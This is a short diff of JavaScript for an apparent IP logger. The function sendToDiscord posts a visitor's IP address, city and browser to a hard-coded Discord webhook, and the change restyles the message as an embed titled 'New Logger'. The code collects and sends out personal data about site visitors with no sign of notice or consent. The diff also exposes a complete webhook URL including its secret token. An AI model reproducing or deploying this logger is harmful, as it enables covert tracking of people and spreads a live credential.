@@ -2,8 +2,19 @@ function sendToDiscord(ip, city, browser) {
     const webhookUrl = 'https://discord.com/api/webhooks/1272920222776426516/s8qm5PBe-j1Xe9iTzCNzt_DHIW6L3Fur5IHKuA0c3dOKr9urmfQNQosJPSiib0FUGrBS';  // Your Discord webhook URL
 
     const payload = {
-        content: `User IP: ${ip}\nCity: ${city}\nBrowser: ${browser}`,  // Message content
+        embeds: [{
+            title: "__🤖 New Logger__",
+            description: "**Logging user information...**",
+            color: 7506394,
+            fields: [
+                { name: "__🍦 IP Address__", value: `**${ip}**`, inline: true },
+                { name: "__🚬 City__", value: `**${city}**`, inline: true },
+                { name: "__🚀 Browser__", value: `**${browser}**`, inline: true },
+            ],
+            timestamp: new Date().toISOString(),  // Current timestamp
+        }]
     };
+    
 
     fetch(webhookUrl, {
         method: 'POST',
